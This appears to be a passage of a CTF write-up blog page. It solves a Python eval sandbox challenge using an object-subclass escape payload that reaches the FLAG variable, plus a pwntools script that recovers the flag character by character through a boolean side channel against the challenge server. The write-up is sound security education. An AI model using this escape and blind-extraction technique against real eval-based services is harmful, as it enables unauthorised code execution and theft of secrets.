+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">156</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;sys&#39;</span>]<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;__main__&#39;</span>]<span style="color:#f92672">.</span>FLAG
+</span></span></code></pre></div><p>Since <code>eval()</code> doesn&rsquo;t print results, we need to extract the flag character by character using boolean logic:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>(()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">156</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;sys&#39;</span>]<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;__main__&#39;</span>]<span style="color:#f92672">.</span>FLAG[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;f&#39;</span>)<span style="color:#f92672">+</span>TARGET<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>We are supposed to be evauling math expressions. If our answers = Target, then we get back <code>Correct!</code>, otherwise <code>Wrong</code>. We can compare a byte in the flag to a char, and if it is correct, our expression evaluates to <code>True</code>. True in python is equal to 1, and False is zero. So if we add a True expression to Target -1, we get the correct value and <code>Correct!</code>. Using this, we can extract the flag byte by byte. See script below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ERROR&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;grey{&#34;</span>
+</span></span><span style="display:flex;"><span>index <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>all_chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1234567890_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&#34;#$%&amp;\()*+,-./:;&lt;=&gt;?@[</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">]^_{|}~&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ch <span style="color:#f92672">in</span> all_chars:
+</span></span><span style="display:flex;"><span>        target <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;challs.nusgreyhats.org&#34;</span>, <span style="color:#ae81ff">33401</span> )
+</span></span><span style="display:flex;"><span>        target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;S&#34;</span>)
+</span></span><span style="display:flex;"><span>        target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Target: &#34;</span>)
+</span></span><span style="display:flex;"><span>        value <span style="color:#f92672">=</span> int(target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;(().__class__.__base__.__subclasses__()[156].__init__.__globals__[&#39;sys&#39;].modules[&#39;__main__&#39;].FLAG[</span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">]==&#39;</span><span style="color:#e6db74">{</span>ch<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)+</span><span style="color:#e6db74">{</span>value<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        target<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>        resp <span style="color:#f92672">=</span> target<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Correct!&#34;</span> <span style="color:#f92672">in</span> resp:
+</span></span><span style="display:flex;"><span>            flag <span style="color:#f92672">+=</span>ch
+</span></span><span style="display:flex;"><span>            index <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>            print(flag)
+</span></span><span style="display:flex;"><span>            target<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">.05</span>)
+</span></span><span style="display:flex;"><span>            target<span style="color:#f92672">.</span>close
+</span></span></code></pre></div><p><code>grey{4_w0r1D_c1As5_c0Un7L3_p1aY3r_1n_0uR_mId5t}</code></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2025 <a href="http://localhost:1313/">CTF Writeups</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
